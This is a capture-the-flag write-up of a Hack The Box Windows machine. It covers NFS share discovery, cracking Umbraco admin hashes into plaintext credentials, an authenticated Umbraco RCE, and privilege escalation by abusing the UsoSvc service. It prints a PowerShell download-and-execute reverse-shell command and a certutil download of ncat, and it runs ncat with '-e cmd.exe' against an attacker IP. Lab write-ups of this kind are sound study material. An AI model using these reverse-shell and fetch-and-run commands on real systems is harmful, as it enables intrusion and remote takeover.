![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/9f14fe3e-5d7d-43ae-9828-310704b98fce)

# Enumeration
Nmap:

![Pasted image 20230620152347](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/670c4087-bbce-47f8-b706-1201ce7318ba)

Oh boy that's a lot...

# Foothold
Starting with FTP. It does allow for anonymous login, but it doesn't seem to contain anything and I don't have permissions to upload anything. Likely just a rabbit hole. Moving on. 

Looking at the website, It doesn't have a whole lot going on. There are a couple pages I can visit. Oddly, there seems to be a pattern with the photos mentioning a brand called "Umbracos" and I don't know what that is... Quick search shows that it is a CMS company. Maybe that's a hint as to what the site is running? There are exploits for it, but unfortunately they are all authenticated so I'll need credentials to utilize them...

Port 111 has an RPCbind which might be interesting. 
Did some reading on hacktricks and they suggested running a more specific nmap scan:

![Pasted image 20230620154447](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/56d7c526-c88c-46e7-85da-270de8b73d5a)

This shows that there are things mounted and publicly visible. I can run a command from my attack machine to try and see the permissions:
```bash
$ showmount --exports 10.129.170.89
```
![Pasted image 20230620154607](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/0901cc5c-13e8-4445-baeb-e461df9a9bfd)

this site_backups might have some good information. Maybe some source code?
I'll mount it and check it out.  
> One thing of note here is that it is an NFS mount so I'll need to specify that during the mounting command

After mounting, I tried looking around, but there's a lot here and I'm not sure what I'm looking for. 
I was able to find a forum post mentioning how to check for version information. 
`Web.config` does show the version as 7.12.4, but again, the only exploits I can run are privileged...  

More digging lead me to a file called `Umbraco.sdf` which has a bunch of configuration stuff. I can run it with the `strings` command to find human readable characters:
![Pasted image 20230620155134](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5ff5a2e3-4f68-42b2-9800-ae7cae793d10)

Those are hashes! I determined they are SHA1 hashes. Pointing hashcat at them reveals credentials:
```
username: admin@htb.local
Password: baconandcheese
```

Cool. Dirb also found a login page for the service at http://10.129.170.89/umbraco/
Testing this login was successful! Now we try an authenticated exploit!
Exploit used: https://github.com/noraj/Umbraco-RCE
I was able get a shell using powercat found here: https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/

I staqrted a netcat listener on 1234 and used the following code:
```bash
python exploit.py -u admin@htb.local -p baconandcheese -i http://10.129.170.89/ -c powershell.exe -a "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.59:8000/powercat.ps1');powercat -c 10.10.14.59 -p 1234 -e cmd"
```

Results:
![Pasted image 20230620155547](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/f76c83e9-3971-4a70-845b-d0f2f66d42ce)

Yay, we got the user!

# Privilege Escalation
First, I need to upload an enumeration script to a writeable directory. `C:\Windows\Temp\` is a good candidate. 
From here I uploaded a script called PowerUp which can be found on the attack box at `/usr/share/windows-resources/powersploit/Privesc/`

To get it on the machine, I need to use the following command:
![Pasted image 20230620155806](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/e82c9725-e84f-4a03-ab9d-ef4cb2eb6fb6)

Then running the command `Invoke-Allchecks` will run the script. 

..... waiting....

Something interesting!
![Pasted image 20230620155845](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/687be2ee-ec59-4680-b5f6-2d3ff720e4d1)

UsoSvc can be run as administrator!

Looking up how to leverage the exploit, I can use certutil.exe to download a netcat script from my linux machine:
```powershell
Certutil.exe -urlcache -f http://10.10.14.59:8000/ncat.exe C:\\Windows\Temp\ncat.exe
```

Now I just need to run the netcat executable using UsoSvc:
```powershell
Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\Windows\Temp\ncat.exe 10.10.14.59 1337 -e cmd.exe"
```
and......
![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/00e16ea3-fbb0-4502-b73e-143d2794c153)

PWNED!!!
